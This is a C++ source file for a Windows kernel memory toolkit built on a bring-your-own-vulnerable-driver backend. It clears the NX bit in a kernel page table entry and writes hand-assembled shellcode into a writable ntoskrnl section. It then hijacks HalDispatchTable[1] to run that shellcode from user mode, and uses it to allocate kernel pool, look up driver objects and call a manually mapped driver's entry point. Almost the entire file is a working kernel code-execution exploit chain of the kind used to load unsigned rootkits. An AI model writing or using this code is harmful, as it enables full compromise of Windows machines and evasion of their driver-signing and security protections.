#include "hinv_kmem.hpp"
#include <windows.h>
#include <winternl.h>
#include <ntstatus.h>
#include <psapi.h>
#include <vector>
#include <cwctype>
#include <algorithm>
#include <cstring>
#include <iostream>

// MinGW does not expose these in winternl.h by default.
#ifndef SystemModuleInformation
#define SystemModuleInformation 11
#endif

typedef struct _RTL_PROCESS_MODULE_INFORMATION {
    HANDLE Section;
    PVOID MappedBase;
    PVOID ImageBase;
    ULONG ImageSize;
    ULONG Flags;
    USHORT LoadOrderIndex;
    USHORT InitOrderIndex;
    USHORT LoadCount;
    USHORT OffsetToFileName;
    UCHAR FullPathName[256];
} RTL_PROCESS_MODULE_INFORMATION, *PRTL_PROCESS_MODULE_INFORMATION;

typedef struct _RTL_PROCESS_MODULES {
    ULONG NumberOfModules;
    RTL_PROCESS_MODULE_INFORMATION Modules[1];
} RTL_PROCESS_MODULES, *PRTL_PROCESS_MODULES;

// KPROFILE_SOURCE is normally in ntddk.h. We only need the value used by
// NtQueryIntervalProfile to trigger HalDispatchTable[1].
typedef enum _KPROFILE_SOURCE {
    ProfileTime = 0,
    ProfileAlignmentFixup = 1,
    ProfileTotalIssues = 2
} KPROFILE_SOURCE;

#ifndef ProfileTotalIssues
#define ProfileTotalIssues ((KPROFILE_SOURCE)2)
#endif

#pragma comment(lib, "ntdll.lib")

namespace hinv {
namespace kmem {

// ---------------------------------------------------------------------------
// PE helpers (work on raw headers read from kernel memory)
// ---------------------------------------------------------------------------

static uint16_t R16(const uint8_t* p) { return *reinterpret_cast<const uint16_t*>(p); }
static uint32_t R32(const uint8_t* p) { return *reinterpret_cast<const uint32_t*>(p); }
static uint64_t R64(const uint8_t* p) { return *reinterpret_cast<const uint64_t*>(p); }

static std::wstring ToLower(std::wstring s) {
    std::transform(s.begin(), s.end(), s.begin(), ::towlower);
    return s;
}

// ---------------------------------------------------------------------------
// Module enumeration
// ---------------------------------------------------------------------------

using NtQuerySystemInformationFn = NTSTATUS(NTAPI*)(
    ULONG SystemInformationClass,
    PVOID SystemInformation,
    ULONG SystemInformationLength,
    PULONG ReturnLength
);

std::vector<KernelModule> EnumKernelModules() {
    std::vector<KernelModule> result;
    auto NtQuerySystemInformation = reinterpret_cast<NtQuerySystemInformationFn>(
        GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "NtQuerySystemInformation"));
    if (!NtQuerySystemInformation) return result;

    ULONG size = 0;
    NtQuerySystemInformation(SystemModuleInformation, nullptr, 0, &size);
    if (size == 0) return result;

    std::vector<uint8_t> buffer(size);
    if (!NT_SUCCESS(NtQuerySystemInformation(SystemModuleInformation, buffer.data(), size, &size)))
        return result;

    auto* info = reinterpret_cast<RTL_PROCESS_MODULES*>(buffer.data());
    for (ULONG i = 0; i < info->NumberOfModules; ++i) {
        const auto& m = info->Modules[i];
        KernelModule km;
        km.base = reinterpret_cast<uint64_t>(m.ImageBase);
        km.size = m.ImageSize;
        std::string asciiName(reinterpret_cast<const char*>(m.FullPathName));
        km.name.assign(asciiName.begin(), asciiName.end());
        // Keep only the file name for display; base/size are what matter.
        size_t slash = km.name.find_last_of(L"\\/");
        if (slash != std::wstring::npos) km.name = km.name.substr(slash + 1);
        result.push_back(km);
    }
    return result;
}

// ---------------------------------------------------------------------------
// Kernel export resolution
// ---------------------------------------------------------------------------

uint64_t GetKernelExport(byovd::IByovdBackend* backend, uint64_t moduleBase, const char* exportName) {
    if (!backend || !moduleBase || !exportName) return 0;

    IMAGE_DOS_HEADER dos{};
    if (!backend->ReadKernelMemory(moduleBase, &dos, sizeof(dos))) return 0;
    if (dos.e_magic != IMAGE_DOS_SIGNATURE) return 0;

    IMAGE_NT_HEADERS64 nt{};
    if (!backend->ReadKernelMemory(moduleBase + dos.e_lfanew, &nt, sizeof(nt))) return 0;
    if (nt.Signature != IMAGE_NT_SIGNATURE) return 0;

    const auto& exportDir = nt.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
    if (exportDir.VirtualAddress == 0 || exportDir.Size == 0) return 0;

    IMAGE_EXPORT_DIRECTORY expDir{};
    if (!backend->ReadKernelMemory(moduleBase + exportDir.VirtualAddress, &expDir, sizeof(expDir))) return 0;

    std::vector<uint32_t> rvas(expDir.NumberOfNames);
    std::vector<uint16_t> ords(expDir.NumberOfNames);
    std::vector<uint32_t> funcs(expDir.NumberOfFunctions);

    if (!backend->ReadKernelMemory(moduleBase + expDir.AddressOfNames, rvas.data(), rvas.size() * sizeof(uint32_t)))
        return 0;
    if (!backend->ReadKernelMemory(moduleBase + expDir.AddressOfNameOrdinals, ords.data(), ords.size() * sizeof(uint16_t)))
        return 0;
    if (!backend->ReadKernelMemory(moduleBase + expDir.AddressOfFunctions, funcs.data(), funcs.size() * sizeof(uint32_t)))
        return 0;

    for (uint32_t i = 0; i < expDir.NumberOfNames; ++i) {
        char name[256]{};
        if (!backend->ReadKernelMemory(moduleBase + rvas[i], name, sizeof(name) - 1)) continue;
        if (std::strcmp(name, exportName) == 0) {
            uint16_t ord = ords[i];
            if (ord < expDir.NumberOfFunctions) {
                return moduleBase + funcs[ord];
            }
        }
    }
    return 0;
}

uint64_t ResolveKernelExport(byovd::IByovdBackend* backend, const wchar_t* moduleName, const char* exportName) {
    auto mods = EnumKernelModules();
    std::wstring target = ToLower(moduleName);
    for (const auto& m : mods) {
        if (ToLower(m.name) == target) {
            return GetKernelExport(backend, m.base, exportName);
        }
    }
    return 0;
}

uint64_t FindHalDispatchTable(byovd::IByovdBackend* backend) {
    uint64_t ntosBase = 0;
    auto mods = EnumKernelModules();
    for (const auto& m : mods) {
        if (ToLower(m.name).find(L"ntoskrnl") != std::wstring::npos) {
            ntosBase = m.base;
            break;
        }
    }
    if (!ntosBase) return 0;
    return GetKernelExport(backend, ntosBase, "HalDispatchTable");
}

// ---------------------------------------------------------------------------
// PTE manipulation helpers (x64 self-referential page tables)
// ---------------------------------------------------------------------------

static uint64_t ComputePteAddress(uint64_t va, uint64_t selfRefIndex) {
    uint64_t pteBase = (selfRefIndex << 39) | (selfRefIndex << 30) | (selfRefIndex << 21) | (selfRefIndex << 12);
    // Sign-extend if needed.
    if (pteBase & 0x0000800000000000ULL) {
        pteBase |= 0xFFFF000000000000ULL;
    }
    return pteBase + ((va >> 12) << 3);
}

// Try common self-referential PML4 indices used by Windows.
static uint64_t FindPteBase(byovd::IByovdBackend* backend) {
    static const uint64_t candidates[] = { 0x1ED, 0x1EDULL /*Win10*/, 0x1EDULL /*Win11*/ };
    for (uint64_t idx : candidates) {
        uint64_t pteBase = (idx << 39) | (idx << 30) | (idx << 21) | (idx << 12);
        if (pteBase & 0x0000800000000000ULL) pteBase |= 0xFFFF000000000000ULL;
        uint64_t probe = pteBase; // should be a valid kernel address in the PTE region
        uint64_t dummy = 0;
        if (backend->ReadKernelMemory(probe, &dummy, sizeof(dummy))) {
            return idx;
        }
    }
    return 0;
}

// ---------------------------------------------------------------------------
// Kernel shellcode execution via HalDispatchTable
// ---------------------------------------------------------------------------

using NtQueryIntervalProfileFn = NTSTATUS(NTAPI*)(KPROFILE_SOURCE ProfileSource, PULONG Interval);

bool ExecuteKernelShellcode(byovd::IByovdBackend* backend,
                            const std::vector<uint8_t>& shellcode,
                            uint64_t arg1,
                            uint64_t arg2,
                            uint64_t* outResult) {
    if (!backend || shellcode.empty() || shellcode.size() > 0x800) return false;

    uint64_t halTable = FindHalDispatchTable(backend);
    if (!halTable) {
        std::cerr << "[hinv::kmem] Failed to locate HalDispatchTable\n";
        return false;
    }

    // Resolve ntoskrnl base and find a writable section to host the shellcode.
    uint64_t ntosBase = 0;
    auto mods = EnumKernelModules();
    for (const auto& m : mods) {
        if (ToLower(m.name).find(L"ntoskrnl") != std::wstring::npos) {
            ntosBase = m.base;
            break;
        }
    }
    if (!ntosBase) {
        std::cerr << "[hinv::kmem] Failed to locate ntoskrnl base\n";
        return false;
    }

    IMAGE_DOS_HEADER dos{};
    if (!backend->ReadKernelMemory(ntosBase, &dos, sizeof(dos))) return false;
    IMAGE_NT_HEADERS64 nt{};
    if (!backend->ReadKernelMemory(ntosBase + dos.e_lfanew, &nt, sizeof(nt))) return false;

    uint16_t numSections = nt.FileHeader.NumberOfSections;
    std::vector<IMAGE_SECTION_HEADER> sections(numSections);
    uint64_t sectionTable = ntosBase + dos.e_lfanew + 4 + sizeof(IMAGE_FILE_HEADER) + nt.FileHeader.SizeOfOptionalHeader;
    if (!backend->ReadKernelMemory(sectionTable, sections.data(), numSections * sizeof(IMAGE_SECTION_HEADER))) return false;

    uint64_t codePage = 0;
    std::vector<uint8_t> originalPage;
    for (const auto& sec : sections) {
        if (sec.Characteristics & IMAGE_SCN_MEM_WRITE) {
            // Search for a zeroed-out region large enough for the shellcode.
            uint64_t secVa = ntosBase + sec.VirtualAddress;
            uint32_t scanSize = sec.Misc.VirtualSize;
            if (scanSize > 0x10000) scanSize = 0x10000;
            std::vector<uint8_t> region(scanSize);
            if (!backend->ReadKernelMemory(secVa, region.data(), scanSize)) continue;

            for (uint32_t off = 0; off + shellcode.size() + 0x10 <= scanSize; off += 0x10) {
                bool clean = true;
                for (size_t k = 0; k < shellcode.size() + 0x10; ++k) {
                    if (region[off + k] != 0) { clean = false; break; }
                }
                if (clean) {
                    codePage = secVa + off;
                    originalPage.assign(region.begin() + off, region.begin() + off + shellcode.size());
                    break;
                }
            }
            if (codePage) break;
        }
    }

    if (!codePage) {
        std::cerr << "[hinv::kmem] No suitable writable kernel scratch region found\n";
        return false;
    }

    // Determine PTE self-ref index and make the scratch page executable.
    uint64_t selfRefIdx = FindPteBase(backend);
    if (!selfRefIdx) {
        std::cerr << "[hinv::kmem] Cannot resolve self-referential page tables\n";
        return false;
    }

    uint64_t pteVa = ComputePteAddress(codePage, selfRefIdx);
    uint64_t originalPte = 0;
    if (!ReadU64(backend, pteVa, originalPte)) {
        std::cerr << "[hinv::kmem] Failed to read PTE\n";
        return false;
    }

    // Clear NX bit (bit 63) while preserving everything else.
    uint64_t execPte = originalPte & ~(1ULL << 63);
    if (!WriteU64(backend, pteVa, execPte)) {
        std::cerr << "[hinv::kmem] Failed to patch PTE\n";
        return false;
    }

    // Read original HalDispatchTable[1].
    uint64_t originalHalEntry = 0;
    if (!ReadU64(backend, halTable + 8, originalHalEntry)) {
        WriteU64(backend, pteVa, originalPte);
        return false;
    }

    // Patch arguments at the beginning of shellcode if the caller used the arg placeholder pattern.
    // We reserve a 16-byte header: movabs rcx, arg1 ; movabs rdx, arg2
    std::vector<uint8_t> patched = shellcode;
    auto PatchU64 = [&](size_t off, uint64_t value) {
        if (off + 8 <= patched.size()) {
            std::memcpy(patched.data() + off, &value, 8);
        }
    };
    PatchU64(2, arg1);  // after 48 b9 (mov rcx, imm64)
    PatchU64(12, arg2); // after 48 ba (mov rdx, imm64)

    // Write shellcode into scratch region.
    if (!backend->WriteKernelMemory(codePage, patched.data(), patched.size())) {
        WriteU64(backend, pteVa, originalPte);
        return false;
    }

    // Overwrite HalDispatchTable[1] with our shellcode address.
    if (!WriteU64(backend, halTable + 8, codePage)) {
        backend->WriteKernelMemory(codePage, originalPage.data(), originalPage.size());
        WriteU64(backend, pteVa, originalPte);
        return false;
    }

    // Trigger execution from usermode.
    auto NtQueryIntervalProfile = reinterpret_cast<NtQueryIntervalProfileFn>(
        GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "NtQueryIntervalProfile"));

    bool triggered = false;
    if (NtQueryIntervalProfile) {
        ULONG interval = 0;
        NTSTATUS status = NtQueryIntervalProfile(ProfileTotalIssues, &interval);
        triggered = NT_SUCCESS(status);
    }

    // Best-effort cleanup.
    WriteU64(backend, halTable + 8, originalHalEntry);
    backend->WriteKernelMemory(codePage, originalPage.data(), originalPage.size());
    WriteU64(backend, pteVa, originalPte);

    if (outResult && triggered) {
        // The shellcode is expected to write its result into the usermode arg1 buffer.
        // We do not read it here because arg1 semantics are caller-defined.
        *outResult = 0;
    }

    return triggered;
}

// ---------------------------------------------------------------------------
// Kernel memory allocation via shellcode
// ---------------------------------------------------------------------------

bool AllocateKernelMemory(byovd::IByovdBackend* backend, size_t size, uint64_t& outKernelVa) {
    if (!backend || size == 0) return false;

    uint64_t allocFn = ResolveKernelExport(backend, L"ntoskrnl.exe", "ExAllocatePool2");
    uint64_t poolType = 0x20; // POOL_FLAG_NON_PAGED (Win10/11)
    if (!allocFn) {
        allocFn = ResolveKernelExport(backend, L"ntoskrnl.exe", "ExAllocatePoolWithTag");
        poolType = 0; // NonPagedPool
    }
    if (!allocFn) {
        std::cerr << "[hinv::kmem] ExAllocatePool2/WithTag not found\n";
        return false;
    }

    // usermode result buffer shared with shellcode
    alignas(8) uint64_t resultBuffer = 0;

    // Context passed in RCX:
    // [+0x00] resultBuffer (kernel writes allocated VA here)
    // [+0x08] allocFn
    // [+0x10] size
    // [+0x18] poolType
    // Shellcode must start with the standard argument prologue so ExecuteKernelShellcode
    // can patch the immediates: movabs rcx, ctxVa ; movabs rdx, 0
    std::vector<uint8_t> sc;
    auto PushU64 = [&](uint64_t v) {
        for (int i = 0; i < 8; ++i) sc.push_back(static_cast<uint8_t>(v >> (i * 8)));
    };

    // movabs rcx, 0   (patched by ExecuteKernelShellcode -> ctxVa)
    sc.insert(sc.end(), { 0x48, 0xB9 });
    PushU64(0);
    // movabs rdx, 0   (patched by ExecuteKernelShellcode -> unused)
    sc.insert(sc.end(), { 0x48, 0xBA });
    PushU64(0);
    // push rbx
    sc.insert(sc.end(), { 0x53 });
    // mov rbx, rcx          ; rbx = context pointer
    sc.insert(sc.end(), { 0x48, 0x89, 0xCB });
    // mov rcx, [rbx+0x18]   ; PoolType / POOL_FLAGS
    sc.insert(sc.end(), { 0x48, 0x8B, 0x4B, 0x18 });
    // mov rdx, [rbx+0x10]   ; NumberOfBytes
    sc.insert(sc.end(), { 0x48, 0x8B, 0x53, 0x10 });
    // mov r8d, 'hinv'       ; Tag
    sc.insert(sc.end(), { 0x41, 0xB8 });
    PushU64(0x68696E76ULL);
    // mov rax, [rbx+0x08]   ; ExAllocatePool* VA
    sc.insert(sc.end(), { 0x48, 0x8B, 0x43, 0x08 });
    // call rax
    sc.insert(sc.end(), { 0xFF, 0xD0 });
    // mov rcx, [rbx]        ; result pointer (usermode)
    sc.insert(sc.end(), { 0x48, 0x8B, 0x0B });
    // mov [rcx], rax        ; store allocated VA
    sc.insert(sc.end(), { 0x48, 0x89, 0x01 });
    // pop rbx
    sc.insert(sc.end(), { 0x5B });
    // ret
    sc.push_back(0xC3);

    uint64_t ctx[4] = { reinterpret_cast<uint64_t>(&resultBuffer), allocFn, size, poolType };
    uint64_t ctxVa = reinterpret_cast<uint64_t>(&ctx);

    if (!ExecuteKernelShellcode(backend, sc, ctxVa, 0, nullptr)) {
        std::cerr << "[hinv::kmem] Allocator shellcode execution failed\n";
        return false;
    }

    outKernelVa = resultBuffer;
    return (outKernelVa != 0);
}

// ---------------------------------------------------------------------------
// Resolve a kernel DriverObject by name
// ---------------------------------------------------------------------------

uint64_t GetDriverObject(byovd::IByovdBackend* backend, const wchar_t* driverName) {
    if (!backend || !driverName) return 0;

    uint64_t obRef = ResolveKernelExport(backend, L"ntoskrnl.exe", "ObReferenceObjectByName");
    uint64_t ioDriverType = ResolveKernelExport(backend, L"ntoskrnl.exe", "IoDriverObjectType");
    if (!obRef || !ioDriverType) {
        std::cerr << "[hinv::kmem] ObReferenceObjectByName or IoDriverObjectType not found\n";
        return 0;
    }

    // Build UNICODE_STRING in usermode. The string buffer is also in usermode;
    // kernel can read usermode memory during the ObReferenceObjectByName call.
    size_t nameLen = std::wcslen(driverName) * sizeof(wchar_t);
    UNICODE_STRING us{};
    us.Length = static_cast<USHORT>(nameLen);
    us.MaximumLength = static_cast<USHORT>(nameLen + sizeof(wchar_t));
    us.Buffer = const_cast<PWSTR>(driverName);

    alignas(8) uint64_t result = 0;
    alignas(8) uint64_t objectOut = 0;

    // Context for shellcode:
    // +0x00 result pointer
    // +0x08 ObReferenceObjectByName
    // +0x10 IoDriverObjectType
    // +0x18 UNICODE_STRING pointer
    // +0x20 scratch for object output
    uint64_t ctx[5] = {
        reinterpret_cast<uint64_t>(&result),
        obRef,
        ioDriverType,
        reinterpret_cast<uint64_t>(&us),
        0
    };
    uint64_t ctxVa = reinterpret_cast<uint64_t>(&ctx);

    std::vector<uint8_t> sc;
    auto Emit = [&](const std::initializer_list<uint8_t>& bytes) { sc.insert(sc.end(), bytes); };
    auto PushU64 = [&](uint64_t v) {
        for (int i = 0; i < 8; ++i) sc.push_back(static_cast<uint8_t>(v >> (i * 8)));
    };

    // movabs rcx, 0 (patched -> ctxVa)
    Emit({ 0x48, 0xB9 }); PushU64(0);
    // movabs rdx, 0 (unused)
    Emit({ 0x48, 0xBA }); PushU64(0);

    // push rbx
    Emit({ 0x53 });
    // mov rbx, rcx
    Emit({ 0x48, 0x89, 0xCB });
    // sub rsp, 0x60
    Emit({ 0x48, 0x81, 0xEC, 0x60, 0x00, 0x00, 0x00 });

    // rcx = UNICODE_STRING
    // rdx = Attributes = 0
    // r8  = PassedAccessState = NULL
    // r9  = DesiredAccess = 0
    Emit({ 0x48, 0x8B, 0x4B, 0x18 });       // mov rcx, [rbx+0x18]
    Emit({ 0x48, 0x31, 0xD2 });             // xor rdx, rdx
    Emit({ 0x4D, 0x31, 0xC0 });             // xor r8, r8
    Emit({ 0x4D, 0x31, 0xC9 });             // xor r9, r9
    Emit({ 0x48, 0xC7, 0x44, 0x24, 0x20, 0x00, 0x00, 0x00, 0x00 }); // [rsp+0x20] = 0
    Emit({ 0x48, 0x8B, 0x43, 0x10 });       // mov rax, [rbx+0x10] (IoDriverObjectType)
    Emit({ 0x48, 0x89, 0x44, 0x24, 0x28 }); // [rsp+0x28] = rax
    Emit({ 0x48, 0xC7, 0x44, 0x24, 0x30, 0x00, 0x00, 0x00, 0x00 }); // [rsp+0x30] = KernelMode
    Emit({ 0x48, 0xC7, 0x44, 0x24, 0x38, 0x00, 0x00, 0x00, 0x00 }); // [rsp+0x38] = NULL
    Emit({ 0x48, 0x8D, 0x43, 0x20 });       // lea rax, [rbx+0x20]
    Emit({ 0x48, 0x89, 0x44, 0x24, 0x40 }); // [rsp+0x40] = &objectOut
    Emit({ 0x48, 0x8B, 0x43, 0x08 });       // mov rax, [rbx+0x08]
    Emit({ 0xFF, 0xD0 });                   // call rax
    Emit({ 0x48, 0x8B, 0x53, 0x20 });       // mov rdx, [rbx+0x20] (object pointer)
    Emit({ 0x48, 0x8B, 0x0B });             // mov rcx, [rbx]
    Emit({ 0x48, 0x89, 0x11 });             // mov [rcx], rdx

    // add rsp, 0x60
    Emit({ 0x48, 0x81, 0xC4, 0x60, 0x00, 0x00, 0x00 });
    // pop rbx
    Emit({ 0x5B });
    // ret
    Emit({ 0xC3 });

    if (!ExecuteKernelShellcode(backend, sc, ctxVa, 0, nullptr)) {
        std::cerr << "[hinv::kmem] GetDriverObject shellcode execution failed\n";
        return 0;
    }

    return result;
}

// ---------------------------------------------------------------------------
// Call a manually mapped driver's DriverEntry from Ring 0
// ---------------------------------------------------------------------------

uint32_t CallDriverEntry(byovd::IByovdBackend* backend, uint64_t driverEntryVa,
                         uint64_t driverObjectVa, uint64_t registryPathVa) {
    if (!backend || !driverEntryVa || !driverObjectVa) return STATUS_INVALID_PARAMETER;

    alignas(8) uint32_t result = 0;
    uint64_t ctx[4] = {
        reinterpret_cast<uint64_t>(&result),
        driverEntryVa,
        driverObjectVa,
        registryPathVa
    };
    uint64_t ctxVa = reinterpret_cast<uint64_t>(&ctx);

    std::vector<uint8_t> sc;
    auto Emit = [&](const std::initializer_list<uint8_t>& bytes) { sc.insert(sc.end(), bytes); };
    auto PushU64 = [&](uint64_t v) {
        for (int i = 0; i < 8; ++i) sc.push_back(static_cast<uint8_t>(v >> (i * 8)));
    };

    // movabs rcx, 0 (patched -> ctxVa)
    Emit({ 0x48, 0xB9 }); PushU64(0);
    // movabs rdx, 0
    Emit({ 0x48, 0xBA }); PushU64(0);

    // push rbx
    Emit({ 0x53 });
    // mov rbx, rcx
    Emit({ 0x48, 0x89, 0xCB });

    Emit({ 0x48, 0x8B, 0x43, 0x08 });       // mov rax, [rbx+0x08] (DriverEntry)
    Emit({ 0x49, 0x89, 0xC2 });             // mov r10, rax
    Emit({ 0x48, 0x8B, 0x53, 0x18 });       // mov rdx, [rbx+0x18] (RegistryPath)
    Emit({ 0x48, 0x8B, 0x4B, 0x10 });       // mov rcx, [rbx+0x10] (DriverObject)
    Emit({ 0x41, 0xFF, 0xD2 });             // call r10
    Emit({ 0x48, 0x8B, 0x0B });             // mov rcx, [rbx]
    Emit({ 0x89, 0x01 });                   // mov [rcx], eax

    // pop rbx
    Emit({ 0x5B });
    // ret
    Emit({ 0xC3 });

    if (!ExecuteKernelShellcode(backend, sc, ctxVa, 0, nullptr)) {
        std::cerr << "[hinv::kmem] CallDriverEntry shellcode execution failed\n";
        return STATUS_UNSUCCESSFUL;
    }

    return result;
}

} // namespace kmem
} // namespace hinv
